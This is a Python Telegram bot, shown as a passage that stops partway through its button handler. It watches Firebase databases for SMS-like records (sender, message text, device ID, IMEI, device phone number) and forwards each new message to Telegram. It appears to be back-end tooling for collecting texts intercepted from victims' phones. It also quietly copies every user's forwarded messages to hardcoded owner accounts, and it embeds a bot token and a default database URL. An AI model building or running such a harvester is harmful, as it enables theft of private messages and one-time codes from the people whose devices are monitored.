import os
import requests
import json
import time
import threading
import hashlib
import html
from datetime import datetime, timezone

# Try to import optional packages
try:
    import speedtest
    SPEEDTEST_AVAILABLE = True
except ImportError:
    SPEEDTEST_AVAILABLE = False
    print("⚠️ speedtest-cli not installed. Install with: pip install speedtest-cli")

try:
    from sseclient import SSEClient
    SSE_AVAILABLE = True
except ImportError:
    SSE_AVAILABLE = False
    print("⚠️ sseclient-py not installed. Install with: pip install sseclient-py")

# ---------------- CONFIG ----------------
BOT_TOKEN = "8500713256:AAF8TjCbO7aj-3GofffCE2H5b0xSU3NUbGc"

if not BOT_TOKEN or BOT_TOKEN.strip() == "":
    print("❌ BOT_TOKEN missing!")
    raise SystemExit(1)

API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
OWNER_IDS = [1451422178]  # Add more owners if needed: [1451422178, 5148880913]
PRIMARY_ADMIN_ID = 1451422178
POLL_INTERVAL = 2
MAX_SSE_RETRIES = 5
MAX_FIREBASE_PER_USER = 5

# DEFAULT FIREBASE CONFIGURATION
DEFAULT_FIREBASE_URL = "https://union-1-1b7ae-default-rtdb.asia-southeast1.firebasedatabase.app/.json"
DEFAULT_FIREBASE_ENABLED = True
CACHE_REFRESH_SECONDS = 1200  # 20 minutes
# ---------------------------------------

OFFSET = None
running = True
firebase_urls = {}
watcher_threads = {}
seen_hashes = {}
approved_users = set(OWNER_IDS)
BOT_START_TIME = time.time()
SENSITIVE_KEYS = {}
firebase_cache = {}
cache_time = {}
blocked_devices = set()
used_firebase_urls = set()
pending_permissions = {}
user_firebase_count = {}

default_firebase_active = False
default_firebase_thread = None

# Store user states for inline interaction
user_states = {}

# ---------- KEYBOARD BUTTONS ----------
def get_main_keyboard(is_admin=False):
    """Create main keyboard with buttons"""
    keyboard = [
        ["📋 My URLs", "🔍 Find Device"],
        ["🔄 Refresh Cache", "🏓 Status"],
        ["🛑 Stop All", "❓ Help"]
    ]
    
    if is_admin:
        keyboard.append(["👑 Admin Panel"])
    
    return {"keyboard": keyboard, "resize_keyboard": True, "one_time_keyboard": False}

def get_admin_keyboard():
    """Create admin panel keyboard"""
    keyboard = [
        ["👥 Approve User", "🚫 Unapprove User"],
        ["📋 All Users", "📊 Statistics"],
        ["🔒 Block Device", "🔓 Unblock Device"],
        ["📵 Blocked List", "🌐 Default Firebase"],
        ["📢 Broadcast", "🛑 Stop All Users"],
        ["◀️ Back to Main"]
    ]
    return {"keyboard": keyboard, "resize_keyboard": True, "one_time_keyboard": False}

def get_default_firebase_keyboard():
    """Create default Firebase management keyboard"""
    keyboard = [
        ["▶️ Start Default", "⏹️ Stop Default"],
        ["🔄 Refresh Default", "📊 Default Status"],
        ["◀️ Back to Admin"]
    ]
    return {"keyboard": keyboard, "resize_keyboard": True, "one_time_keyboard": False}

def get_back_keyboard():
    """Simple back button keyboard"""
    keyboard = [["◀️ Back to Main"]]
    return {"keyboard": keyboard, "resize_keyboard": True, "one_time_keyboard": False}

def remove_keyboard(chat_id):
    """Remove custom keyboard"""
    try:
        payload = {"chat_id": chat_id, "reply_markup": {"remove_keyboard": True}}
        requests.post(f"{API_URL}/sendMessage", json=payload, timeout=10)
    except Exception as e:
        print(f"Error removing keyboard: {e}")

# ---------- UTILITY FUNCTIONS ----------
def normalize_json_url(url):
    if not url:
        return None
    u = url.rstrip("/")
    if not u.endswith(".json"):
        u = u + "/.json"
    return u

def send_msg(chat_id, text, parse_mode="HTML", reply_markup=None, keyboard=None):
    def _send_one(cid):
        try:
            payload = {"chat_id": cid, "text": text}
            if parse_mode:
                payload["parse_mode"] = parse_mode
            if reply_markup is not None:
                payload["reply_markup"] = reply_markup
            elif keyboard is not None:
                payload["reply_markup"] = keyboard
            requests.post(f"{API_URL}/sendMessage", json=payload, timeout=10)
        except Exception as e:
            print(f"send_msg -> failed to send to {cid}: {e}")

    if isinstance(chat_id, (list, tuple, set)):
        for cid in chat_id:
            _send_one(cid)
    else:
        _send_one(chat_id)

def get_updates():
    global OFFSET
    try:
        params = {"timeout": 20}
        if OFFSET:
            params["offset"] = OFFSET
        r = requests.get(f"{API_URL}/getUpdates", params=params, timeout=30).json()
        if r.get("result"):
            OFFSET = r["result"][-1]["update_id"] + 1
        return r.get("result", [])
    except Exception as e:
        print("get_updates error:", e)
        return []

def http_get_json(url):
    try:
        r = requests.get(url, timeout=12)
        r.raise_for_status()
        return r.json()
    except Exception as e:
        print("http_get_json error for", url, "->", e)
        return None

def is_sms_like(obj):
    if not isinstance(obj, dict):
        return False
    keys = {k.lower() for k in obj.keys()}
    score = 0
    if keys & {"message", "msg", "body", "text", "sms"}:
        score += 2
    if keys & {"from", "sender", "address", "source", "number"}:
        score += 2
    if keys & {"time", "timestamp", "ts", "date", "created_at"}:
        score += 1
    if keys & {"device", "deviceid", "imei", "device_id", "phoneid"}:
        score += 1
    return score >= 3

def find_sms_nodes(snapshot, path=""):
    found = []
    if isinstance(snapshot, dict):
        for k, v in snapshot.items():
            p = f"{path}/{k}" if path else k
            if is_sms_like(v):
                found.append((p, v))
            if isinstance(v, (dict, list)):
                found += find_sms_nodes(v, p)
    elif isinstance(snapshot, list):
        for i, v in enumerate(snapshot):
            p = f"{path}/{i}"
            if is_sms_like(v):
                found.append((p, v))
            if isinstance(v, (dict, list)):
                found += find_sms_nodes(v, p)
    return found

def extract_fields(obj):
    device = (
        obj.get("device")
        or obj.get("deviceId")
        or obj.get("device_id")
        or obj.get("imei")
        or obj.get("id")
        or "Unknown"
    )
    sender = (
        obj.get("from")
        or obj.get("sender")
        or obj.get("address")
        or obj.get("number")
        or "Unknown"
    )
    message = (
        obj.get("message")
        or obj.get("msg")
        or obj.get("body")
        or obj.get("text")
        or ""
    )
    ts = (
        obj.get("time")
        or obj.get("timestamp")
        or obj.get("date")
        or obj.get("created_at")
        or None
    )
    if isinstance(ts, (int, float)):
        try:
            ts = (
                datetime.fromtimestamp(float(ts), tz=timezone.utc)
                .astimezone()
                .strftime("%d/%m/%Y, %I:%M:%S %p")
            )
        except Exception:
            ts = str(ts)
    elif isinstance(ts, str):
        digits = "".join(ch for ch in ts if ch.isdigit())
        if len(digits) == 10:
            try:
                ts = (
                    datetime.fromtimestamp(int(digits), tz=timezone.utc)
                    .astimezone()
                    .strftime("%d/%m/%Y, %I:%M:%S %p")
                )
            except Exception:
                pass
    if not ts:
        ts = datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")
    device_phone = (
        obj.get("phone") or obj.get("mobile") or obj.get("MobileNumber") or None
    )
    return {
        "device": device,
        "sender": sender,
        "message": message,
        "time": ts,
        "device_phone": device_phone,
    }

def compute_hash(path, obj):
    try:
        return hashlib.sha1(
            (path + json.dumps(obj, sort_keys=True, default=str)).encode()
        ).hexdigest()
    except Exception:
        return hashlib.sha1((path + str(obj)).encode()).hexdigest()

def format_notification(fields, user_id, is_default=False):
    device = html.escape(str(fields.get("device", "Unknown")))
    sender = html.escape(str(fields.get("sender", "Unknown")))
    message = html.escape(str(fields.get("message", "")))
    t = html.escape(str(fields.get("time", "")))
    
    if is_default:
        text = (
            f"🆕 <b>New SMS Received (Default Firebase)</b>\n\n"
            f"📱 Device: <code>{device}</code>\n"
            f"👤 From: <b>{sender}</b>\n"
            f"💬 Message: {message}\n"
            f"🕐 Time: {t}\n"
            f"👤 Forwarded by Admin Only"
        )
    else:
        text = (
            f"🆕 <b>New SMS Received</b>\n\n"
            f"📱 Device: <code>{device}</code>\n"
            f"👤 From: <b>{sender}</b>\n"
            f"💬 Message: {message}\n"
            f"🕐 Time: {t}\n"
            f"👤 Forwarded by User ID: <code>{user_id}</code>"
        )
    
    if fields.get("device_phone"):
        text += (
            f"\n📞 Device Number: "
            f"<code>{html.escape(str(fields.get('device_phone')))}</code>"
        )
    return text

def notify_user_owner(chat_id, fields, is_default=False):
    device_id = fields.get("device", "")
    if device_id and device_id in blocked_devices:
        print(f"📵 Skipping notification for blocked device: {device_id}")
        return
    
    if is_default:
        text = format_notification(fields, chat_id, is_default=True)
        send_msg(OWNER_IDS, text)
        print(f"📨 Default Firebase notification sent to owners")
    else:
        text = format_notification(fields, chat_id, is_default=False)
        send_msg(chat_id, text)
        send_msg(OWNER_IDS, text)

# ---------- SSE WATCHER (with fallback) ----------
def sse_loop(chat_id, base_url, is_default=False):
    url = base_url.rstrip("/")
    if not url.endswith(".json"):
        url = url + "/.json"
    stream_url = url + "?print=silent"
    
    if is_default:
        seen_key = "__DEFAULT_FIREBASE__"
        if seen_key not in seen_hashes:
            seen_hashes[seen_key] = {}
        if base_url not in seen_hashes[seen_key]:
            seen_hashes[seen_key][base_url] = set()
        seen = seen_hashes[seen_key][base_url]
    else:
        seen = seen_hashes.setdefault(chat_id, {}).setdefault(base_url, set())
    
    if not is_default:
        send_msg(chat_id, f"⚡ SSE (live) started for Firebase.\n\n📌 URL: <code>{base_url}</code>")
    
    print(f"🔌 SSE started for {base_url} (default={is_default})")
    retries = 0
    
    check_condition = lambda: (is_default and DEFAULT_FIREBASE_ENABLED) or (not is_default and base_url in firebase_urls.get(chat_id, []))
    
    while check_condition():
        try:
            if SSE_AVAILABLE:
                client = SSEClient(stream_url)
                for event in client.events():
                    if not check_condition():
                        break
                    if not event.data or event.data == "null":
                        continue
                    try:
                        data = json.loads(event.data)
                    except Exception:
                        continue
                    payload = (
                        data.get("data")
                        if isinstance(data, dict) and "data" in data
                        else data
                    )
                    nodes = find_sms_nodes(payload, "")
                    for path, obj in nodes:
                        h = compute_hash(path, obj)
                        if h in seen:
                            continue
                        seen.add(h)
                        fields = extract_fields(obj)
                        device_id = fields.get("device", "")
                        if device_id and device_id in blocked_devices:
                            continue
                        if is_default:
                            notify_user_owner(None, fields, is_default=True)
                        else:
                            notify_user_owner(chat_id, fields, is_default=False)
            else:
                # Fallback to polling if SSE not available
                poll_loop(chat_id, base_url, is_default)
                break
                
            retries = 0
        except Exception as e:
            print(f"SSE error ({chat_id}, default={is_default}):", e)
            retries += 1
            if retries >= MAX_SSE_RETRIES:
                if not is_default:
                    send_msg(
                        chat_id,
                        f"⚠️ SSE failed, falling back to polling for: <code>{base_url}</code>",
                    )
                poll_loop(chat_id, base_url, is_default)
                break
            backoff = min(30, 2 ** retries)
            time.sleep(backoff)

def poll_loop(chat_id, base_url, is_default=False):
    url = base_url.rstrip("/")
    if not url.endswith(".json"):
        url = url + "/.json"
    
    if is_default:
        seen_key = "__DEFAULT_FIREBASE__"
        if seen_key not in seen_hashes:
            seen_hashes[seen_key] = {}
        if base_url not in seen_hashes[seen_key]:
            seen_hashes[seen_key][base_url] = set()
        seen = seen_hashes[seen_key][base_url]
    else:
        seen = seen_hashes.setdefault(chat_id, {}).setdefault(base_url, set())
    
    if not is_default:
        send_msg(chat_id, f"📡 Polling started for Firebase (every {POLL_INTERVAL}s).\n\n📌 URL: <code>{base_url}</code>")
    
    check_condition = lambda: (is_default and DEFAULT_FIREBASE_ENABLED) or (not is_default and base_url in firebase_urls.get(chat_id, []))
    
    while check_condition():
        snap = http_get_json(url)
        if not snap:
            time.sleep(POLL_INTERVAL)
            continue
        nodes = find_sms_nodes(snap, "")
        for path, obj in nodes:
            h = compute_hash(path, obj)
            if h in seen:
                continue
            seen.add(h)
            fields = extract_fields(obj)
            device_id = fields.get("device", "")
            if device_id and device_id in blocked_devices:
                continue
            if is_default:
                notify_user_owner(None, fields, is_default=True)
            else:
                notify_user_owner(chat_id, fields, is_default=False)
        time.sleep(POLL_INTERVAL)
    
    if not is_default:
        send_msg(chat_id, f"⛔ Polling stopped for Firebase: <code>{base_url}</code>")

# ---------- DEFAULT FIREBASE MANAGER ----------
def start_default_firebase():
    global default_firebase_active, default_firebase_thread
    
    if not DEFAULT_FIREBASE_ENABLED:
        print("⚠️ Default Firebase is disabled")
        return False
    
    if default_firebase_active:
        return True
    
    print("🚀 Starting Default Firebase monitoring...")
    test_url = normalize_json_url(DEFAULT_FIREBASE_URL)
    if not http_get_json(test_url):
        print("❌ Default Firebase URL not accessible")
        send_msg(OWNER_IDS, "❌ Default Firebase URL not accessible")
        return False
    
    used_firebase_urls.add(DEFAULT_FIREBASE_URL)
    seen_key = "__DEFAULT_FIREBASE__"
    if seen_key not in seen_hashes:
        seen_hashes[seen_key] = {}
    seen_hashes[seen_key][DEFAULT_FIREBASE_URL] = set()
    
    snap = http_get_json(test_url)
    if snap:
        for p, o in find_sms_nodes(snap, ""):
            seen_hashes[seen_key][DEFAULT_FIREBASE_URL].add(compute_hash(p, o))
    
    default_firebase_thread = threading.Thread(
        target=sse_loop, 
        args=(None, DEFAULT_FIREBASE_URL, True), 
        daemon=True
    )
    default_firebase_thread.start()
    default_firebase_active = True
    
    send_msg(OWNER_IDS, f"✅ Default Firebase started.\n📌 URL: <code>{DEFAULT_FIREBASE_URL}</code>")
    refresh_firebase_cache_single(None, DEFAULT_FIREBASE_URL, is_default=True)
    return True

def stop_default_firebase():
    global default_firebase_active
    if not default_firebase_active:
        return False
    default_firebase_active = False
    if DEFAULT_FIREBASE_URL in used_firebase_urls:
        used_firebase_urls.remove(DEFAULT_FIREBASE_URL)
    send_msg(OWNER_IDS, f"🛑 Default Firebase stopped.")
    return True

def refresh_default_firebase():
    if not default_firebase_active:
        return "❌ Default Firebase not active"
    refresh_firebase_cache_single(None, DEFAULT_FIREBASE_URL, is_default=True)
    return "✅ Default Firebase cache refreshed"

# ---------- START / STOP ----------
def start_watcher(chat_id, base_url):
    if chat_id not in firebase_urls:
        firebase_urls[chat_id] = []
    if base_url in firebase_urls[chat_id]:
        send_msg(chat_id, f"⚠️ Already monitoring: <code>{base_url}</code>")
        return False
    
    current_count = len(firebase_urls.get(chat_id, []))
    if current_count >= MAX_FIREBASE_PER_USER:
        send_msg(chat_id, f"❌ Limit reached ({MAX_FIREBASE_PER_USER})")
        return False
    
    firebase_urls[chat_id].append(base_url)
    if chat_id not in seen_hashes:
        seen_hashes[chat_id] = {}
    seen_hashes[chat_id][base_url] = set()
    used_firebase_urls.add(base_url)
    user_firebase_count[chat_id] = user_firebase_count.get(chat_id, 0) + 1
    
    json_url = normalize_json_url(base_url)
    snap = http_get_json(json_url)
    if snap:
        for p, o in find_sms_nodes(snap, ""):
            seen_hashes[chat_id][base_url].add(compute_hash(p, o))
    
    t = threading.Thread(target=sse_loop, args=(chat_id, base_url, False), daemon=True)
    if chat_id not in watcher_threads:
        watcher_threads[chat_id] = []
    watcher_threads[chat_id].append(t)
    t.start()
    
    send_msg(chat_id, f"✅ Monitoring started: <code>{base_url}</code>")
    refresh_firebase_cache_single(chat_id, base_url, is_default=False)
    return True

def stop_watcher_single(chat_id, base_url=None):
    if chat_id not in firebase_urls or not firebase_urls[chat_id]:
        return False
    
    if base_url is None:
        urls_to_stop = firebase_urls[chat_id].copy()
    else:
        if base_url not in firebase_urls[chat_id]:
            return False
        urls_to_stop = [base_url]
    
    for url in urls_to_stop:
        if url in firebase_urls[chat_id]:
            firebase_urls[chat_id].remove(url)
        if url in used_firebase_urls:
            still_in_use = False
            for uid, urls in firebase_urls.items():
                if url in urls:
                    still_in_use = True
                    break
            if not still_in_use:
                used_firebase_urls.remove(url)
        if chat_id in seen_hashes and url in seen_hashes[chat_id]:
            del seen_hashes[chat_id][url]
    
    user_firebase_count[chat_id] = len(firebase_urls.get(chat_id, []))
    
    if not firebase_urls.get(chat_id):
        if chat_id in firebase_urls:
            del firebase_urls[chat_id]
        if chat_id in seen_hashes:
            del seen_hashes[chat_id]
    
    if base_url is None:
        send_msg(chat_id, "🛑 All monitoring stopped.")
    else:
        send_msg(chat_id, f"🛑 Stopped: <code>{base_url}</code>")
    return True

def stop_all_watchers():
    users_to_stop = list(firebase_urls.keys())
    total_stopped = 0
    for chat_id in users_to_stop:
        if stop_watcher_single(chat_id):
            total_stopped += 1
    return total_stopped

# ---------- BLOCK FUNCTIONS ----------
def extract_device_id_from_message(msg_text):
    if not msg_text:
        return None
    lines = msg_text.split('\n')
    for line in lines:
        if 'Device:' in line or '📱 Device:' in line:
            parts = line.split(':', 1)
            if len(parts) > 1:
                device_id = parts[1].strip()
                device_id = device_id.replace('<code>', '').replace('</code>', '')
                return device_id
    return None

def block_device(device_id):
    blocked_devices.add(device_id)
    return True

def unblock_device(device_id):
    if device_id in blocked_devices:
        blocked_devices.remove(device_id)
        return True
    return False

def get_blocked_devices():
    return sorted(list(blocked_devices))

# ---------- APPROVAL HELPERS ----------
def is_owner(user_id):
    return user_id in OWNER_IDS

def is_approved(user_id):
    return user_id in approved_users or is_owner(user_id)

def handle_not_approved(chat_id, msg):
    from_user = msg.get("from", {}) or {}
    first_name = from_user.get("first_name", "")
    username = from_user.get("username", None)
    reply_markup = {
        "inline_keyboard": [[{"text": "📨 Contact Admin", "url": f"tg://user?id={PRIMARY_ADMIN_ID}"}]]
    }
    user_info_lines = [
        "❌ You are not approved.",
        "Tap below to contact admin.",
        f"🆔 Your ID: <code>{chat_id}</code>",
    ]
    if username:
        user_info_lines.append(f"👤 Username: @{html.escape(username)}")
    send_msg(chat_id, "\n".join(user_info_lines), reply_markup=reply_markup)
    owner_text = [
        "⚠️ New user:",
        f"ID: <code>{chat_id}</code>",
        f"Name: {html.escape(first_name)}",
        f"Approve: <code>/approve {chat_id}</code>"
    ]
    if username:
        owner_text.append(f"Username: @{html.escape(username)}")
    send_msg(OWNER_IDS, "\n".join(owner_text))

def format_uptime(seconds):
    days = seconds // 86400
    seconds %= 86400
    hours = seconds // 3600
    seconds %= 3600
    minutes = seconds // 60
    seconds %= 60
    parts = []
    if days: parts.append(f"{days}d")
    if hours: parts.append(f"{hours}h")
    if minutes: parts.append(f"{minutes}m")
    parts.append(f"{seconds}s")
    return " ".join(parts)

# ---------- NETWORK SPEED TEST ----------
def get_network_speed():
    if not SPEEDTEST_AVAILABLE:
        return {"download": "N/A", "upload": "N/A", "ping": "N/A"}
    try:
        st = speedtest.Speedtest()
        st.get_best_server()
        download_speed = st.download() / 1_000_000
        upload_speed = st.upload() / 1_000_000
        ping = st.results.ping
        return {
            "download": f"{download_speed:.2f} Mbps",
            "upload": f"{upload_speed:.2f} Mbps",
            "ping": f"{ping:.2f} ms"
        }
    except Exception as e:
        print(f"Speed test error: {e}")
        return {"download": "Failed", "upload": "Failed", "ping": "Failed"}

# ---------- SAFE DEVICE SEARCH ----------
def mask_number(value, keep_last=2):
    if not value:
        return ""
    s = "".join(ch for ch in str(value) if ch.isdigit())
    if len(s) <= keep_last:
        return "*" * len(s)
    return "*" * (len(s) - keep_last) + s[-keep_last:]

def search_records_by_device(snapshot, device_id, path="", limit=3):
    matches = []
    if isinstance(snapshot, dict):
        for k, v in snapshot.items():
            if str(k) == str(device_id) and isinstance(v, dict):
                matches.append(v)
            if isinstance(v, dict):
                device_fields = ["device", "deviceId", "device_id", "DeviceID", "DeviceId", "imei", "id"]
                for field in device_fields:
                    if field in v and str(v[field]) == str(device_id):
                        matches.append(v)
                        break
            if isinstance(v, (dict, list)) and len(matches) < limit:
                matches += search_records_by_device(v, device_id, limit=limit - len(matches))
    elif isinstance(snapshot, list):
        for v in snapshot:
            if isinstance(v, dict):
                device_fields = ["device", "deviceId", "device_id", "DeviceID", "DeviceId", "imei", "id"]
                for field in device_fields:
                    if field in v and str(v[field]) == str(device_id):
                        matches.append(v)
                        break
            if isinstance(v, (dict, list)) and len(matches) < limit:
                matches += search_records_by_device(v, device_id, limit=limit - len(matches))
    return matches[:limit]

def safe_format_device_record(rec, url=None):
    lines = ["🔍 <b>Record Found</b>", ""]
    if url:
        lines.append(f"📌 URL: <code>{url}</code>")
        lines.append("")
    relevant_fields = ["message", "msg", "text", "body", "from", "sender", "address", "number", "time", "timestamp", "date", "device", "deviceId", "device_id"]
    for k, v in rec.items():
        if any(field.lower() in k.lower() for field in relevant_fields):
            lines.append(f"<b>{html.escape(str(k))}</b>: <code>{html.escape(str(v))}</code>")
    return "\n".join(lines)

# ---------- CACHE FUNCTIONS ----------
def refresh_firebase_cache_single(chat_id, base_url, is_default=False):
    if is_default:
        snap = http_get_json(normalize_json_url(base_url))
        if snap is None:
            return False
        seen_key = "__DEFAULT_FIREBASE__"
        if seen_key not in firebase_cache:
            firebase_cache[seen_key] = {}
        firebase_cache[seen_key][base_url] = snap
        if seen_key not in cache_time:
            cache_time[seen_key] = {}
        cache_time[seen_key][base_url] = time.time()
        return True
    else:
        if chat_id not in firebase_urls or base_url not in firebase_urls[chat_id]:
            return False
        snap = http_get_json(normalize_json_url(base_url))
        if snap is None:
            return False
        if chat_id not in firebase_cache:
            firebase_cache[chat_id] = {}
        firebase_cache[chat_id][base_url] = snap
        if chat_id not in cache_time:
            cache_time[chat_id] = {}
        cache_time[chat_id][base_url] = time.time()
        return True

def cache_refresher_loop():
    while True:
        now = time.time()
        for chat_id, urls in list(firebase_urls.items()):
            for url in urls:
                last_refresh = cache_time.get(chat_id, {}).get(url, 0)
                if now - last_refresh >= CACHE_REFRESH_SECONDS:
                    refresh_firebase_cache_single(chat_id, url, is_default=False)
        if default_firebase_active:
            last_refresh = cache_time.get("__DEFAULT_FIREBASE__", {}).get(DEFAULT_FIREBASE_URL, 0)
            if now - last_refresh >= CACHE_REFRESH_SECONDS:
                refresh_firebase_cache_single(None, DEFAULT_FIREBASE_URL, is_default=True)
        time.sleep(60)

def manual_refresh_cache(chat_id, firebase_url=None):
    if firebase_url:
        if firebase_url == DEFAULT_FIREBASE_URL and default_firebase_active and is_owner(chat_id):
            if refresh_firebase_cache_single(None, firebase_url, is_default=True):
                return f"✅ Refreshed: <code>{firebase_url}</code>"
        elif chat_id in firebase_urls and firebase_url in firebase_urls[chat_id]:
            if refresh_firebase_cache_single(chat_id, firebase_url, is_default=False):
                return f"✅ Refreshed: <code>{firebase_url}</code>"
        return f"❌ Not found: <code>{firebase_url}</code>"
    else:
        user_urls = firebase_urls.get(chat_id, [])
        if not user_urls:
            return "ℹ️ No active URLs"
        refreshed = 0
        for url in user_urls:
            if refresh_firebase_cache_single(chat_id, url, is_default=False):
                refreshed += 1
        return f"✅ Refreshed {refreshed}/{len(user_urls)} URLs"

# ---------- PERMISSION SYSTEM ----------
def request_permission(chat_id, firebase_url):
    if chat_id not in user_firebase_count:
        user_firebase_count[chat_id] = 0
    if user_firebase_count[chat_id] >= MAX_FIREBASE_PER_USER:
        pending_permissions[chat_id] = firebase_url
        current_urls = firebase_urls.get(chat_id, [])
        urls_text = "\n".join([f"{i+1}. <code>{url}</code>" for i, url in enumerate(current_urls)])
        message = (
            f"⚠️ Limit reached ({MAX_FIREBASE_PER_USER})\n\n"
            f"Current:\n{urls_text}\n\n"
            f"New: <code>{firebase_url}</code>\n\n"
            f"Use /stop to remove one"
        )
        send_msg(chat_id, message)
        return False
    return True

# ---------- BROADCAST ----------
def broadcast_message(sender_id, message_text):
    if not is_owner(sender_id):
        return "❌ Only owners"
    if not message_text:
        return "❌ No message"
    success = 0
    fail = 0
    for user_id in approved_users:
        try:
            send_msg(user_id, f"📢 <b>Broadcast</b>\n\n{message_text}")
            success += 1
        except:
            fail += 1
    return f"✅ Sent to {success} users. Failed: {fail}"

# ---------- COMMAND HANDLING WITH BUTTONS ----------
def handle_button_press(chat_id, text, is_admin=False):
    """Handle button presses"""
    
    # Main menu buttons
    if text == "📋 My URLs":
        urls = firebase_urls.get(chat_id, [])
        if not urls and (not is_admin or not default_firebase_active):
            send_msg(chat_id, "ℹ️ No active URLs", keyboard=get_main_keyboard(is_admin))
        else:
            msg = f"📋 Your URLs ({len(urls)}/{MAX_FIREBASE_PER_USER}):\n\n"
            for i, url in enumerate(urls, 1):
                msg += f"{i}. <code>{url}</code>\n"
            if is_admin and default_firebase_active:
                msg += f"\n📌 <b>Default Firebase (Admin Only):</b>\n   <code>{DEFAULT_FIREBASE_URL}</code>"
            send_msg(chat_id, msg, keyboard=get_main_keyboard(is_admin))
        return True
    
    elif text == "🔍 Find Device":
        send_msg(chat_id, "🔍 Send me the Device ID to search\n\nExample: /find DEVICE_ID", keyboard=get_main_keyboard(is_admin))
        user_states[chat_id] = "waiting_for_device"
        return True
    
    elif text == "🔄 Refresh Cache":
        result = manual_refresh_cache(chat_id)
        send_msg(chat_id, result, keyboard=get_main_keyboard(is_admin))
        return True
    
    elif text == "🏓 Status":
        uptime = format_uptime(int(time.time() - BOT_START_TIME))
        speed = get_network_speed()
        msg = (
            f"🏓 <b>Bot Status</b>\n\n"
            f"✅ Online\n"
            f"⏱ Uptime: {uptime}\n"
            f"📡 Your URLs: {len(firebase_urls.get(chat_id, []))}/{MAX_FIREBASE_PER_USER}\n"
            f"🌐 Total: {sum(len(u) for u in firebase_urls.values())}\n"
            f"📶 Download: {speed['download']}\n"
            f"⬆️ Upload: {speed['upload']}\n"
            f"📍 Ping: {speed['ping']}"
        )
        if is_admin:
            msg += f"\n\n👑 Default: {'Active' if default_firebase_active else 'Inactive'}"
        send_msg(chat_id, msg, keyboard=get_main_keyboard(is_admin))
        return True
    
    elif text == "🛑 Stop All":
        stop_watcher_single(chat_id)
        send_msg(chat_id, "🛑 All monitoring stopped", keyboard=get_main_keyboard(is_admin))
        return True
    
    elif text == "❓ Help":
        if is_admin:
            help_msg = (
                "📚 <b>Full Help</b>\n\n"
                "👤 <b>User Commands:</b>\n"
                "• /start - Welcome message\n"
                "• /stop - Stop all monitoring\n"
                "• /stop <url> - Stop specific\n"
                "• /list - Your URLs\n"
                "• /find <id> - Search device\n"
                "• /ping - Status & speed\n"
                "• /refresh [url] - Refresh cache\n\n"
                "👑 <b>Admin Commands:</b>\n"
                "• /adminlist - All URLs\n"
                "• /approve <id> - Approve user\n"
                "• /unapprove <id> - Remove\n"
                "• /approvedlist - List users\n"
                "• /block <id> - Block device\n"
                "• /unblock <id> - Unblock\n"
                "• /blockedlist - Blocked devices\n"
                "• /stopall - Stop all\n"
                "• /broadcast <msg> - Broadcast\n"
                "• /stats - Statistics\n"
                "• /default_start - Start default\n"
                "• /default_stop - Stop default\n"
                "• /default_refresh - Refresh default\n"
                "• /default_status - Default status\n\n"
                "📝 Send Firebase URL to start monitoring\nCache refreshes every 20 min\nMax 5 URLs per user"
            )
        else:
            help_msg = (
                "📚 <b>Help</b>\n\n"
                "<b>Commands:</b>\n"
                "• /start - Welcome message\n"
                "• /stop - Stop all monitoring\n"
                "• /stop <url> - Stop specific\n"
                "• /list - Your URLs\n"
                "• /find <id> - Search device\n"
                "• /ping - Status & speed\n"
                "• /refresh [url] - Refresh cache\n"
                "• /help - This message\n\n"
                "<b>Using Buttons:</b>\n"
                "Use the buttons below to access features\n\n"
                "📝 Send Firebase URL to start monitoring\nCache refreshes every 20 min\nMax 5 URLs per user"
            )
        send_msg(chat_id, help_msg, keyboard=get_main_keyboard(is_admin))
        return True
    
    elif text == "👑 Admin Panel" and is_admin:
        send_msg(chat_id, "👑 <b>Admin Panel</b>\n\nSelect an option:", keyboard=get_admin_keyboard())
        return True
    
    # Admin panel buttons
    elif text == "👥 Approve User" and is_admin:
        send_msg(chat_id, "📝 Send the user ID to approve\n\nExample: /approve 123456789", keyboard=get_admin_keyboard())
        user_states[chat_id] = "waiting_for_approve"
        return True
    
    elif text == "🚫 Unapprove User" and is_admin:
        send_msg(chat_id, "📝 Send the user ID to unapprove\n\nExample: /unapprove 123456789", keyboard=get_admin_keyboard())
        user_states[chat_id] = "waiting_for_unapprove"
        return True
    
    elif text == "📋 All Users" and is_admin:
        if not approved_users:
            send_msg(chat_id, "No approved users", keyboard=get_admin_keyboard())
            return True
        lines = []
        for uid in sorted(approved_users):
            tag = "👑" if uid in OWNER_IDS else ""
            active = "✅" if uid in firebase_urls else "❌"
            count = len(firebase_urls.get(uid, []))
            lines.append(f"{active} <code>{uid}</code> ({count}) {tag}")
        msg = "✅ Approved Users:\n\n" + "\n".join(lines)
        send_msg(chat_id, msg, keyboard=get_admin_keyboard())
        return True
    
    elif text == "📊 Statistics" and is_admin:
        uptime = format_uptime(int(time.time() - BOT_START_TIME))
        total_users = len(firebase_urls)
        total_monitors = sum(len(u) for u in firebase_urls.values())
        stats = (
            f"📊 <b>Statistics</b>\n\n"
            f"Uptime: {uptime}\n"
            f"Approved: {len(approved_users)}\n"
            f"Active Users: {total_users}\n"
            f"Monitors: {total_monitors}\n"
            f"Unique URLs: {len(used_firebase_urls)}\n"
            f"Blocked Devices: {len(blocked_devices)}\n"
            f"Default: {'Active' if default_firebase_active else 'Inactive'}\n"
            f"Cache: Every {CACHE_REFRESH_SECONDS//60} min"
        )
        send_msg(chat_id, stats, keyboard=get_admin_keyboard())
        return True
    
    elif text == "🔒 Block Device" and is_admin:
        send_msg(chat_id, "🔒 Send the Device ID to block\n\nExample: /block DEVICE_ID\n\nOr reply to an SMS message with /block", keyboard=get_admin_keyboard())
        user_states[chat_id] = "waiting_for_block"
        return True
    
    elif text == "🔓 Unblock Device" and is_admin:
        send_msg(chat_id, "🔓 Send the Device ID to unblock\n\nExample: /unblock DEVICE_ID", keyboard=get_admin_keyboard())
        user_states[chat_id] = "waiting_for_unblock"
        return True
    
    elif text == "📵 Blocked List" and is_admin:
        devices = get_blocked_devices()
        if not devices:
            send_msg(chat_id, "📭 No blocked devices", keyboard=get_admin_keyboard())
        else:
            msg = "📵 Blocked Devices:\n\n" + "\n".join([f"• <code>{d}</code>" for d in devices])
            send_msg(chat_id, msg, keyboard=get_admin_keyboard())
        return True
    
    elif text == "🌐 Default Firebase" and is_admin:
        send_msg(chat_id, "🌐 <b>Default Firebase Management</b>\n\nSelect an option:", keyboard=get_default_firebase_keyboard())
        return True
    
    elif text == "📢 Broadcast" and is_admin:
        send_msg(chat_id, "📢 Send the message to broadcast to all users\n\nExample: /broadcast Hello everyone!", keyboard=get_admin_keyboard())
        user_states[chat_id] = "waiting_for_broadcast"
        return True
    
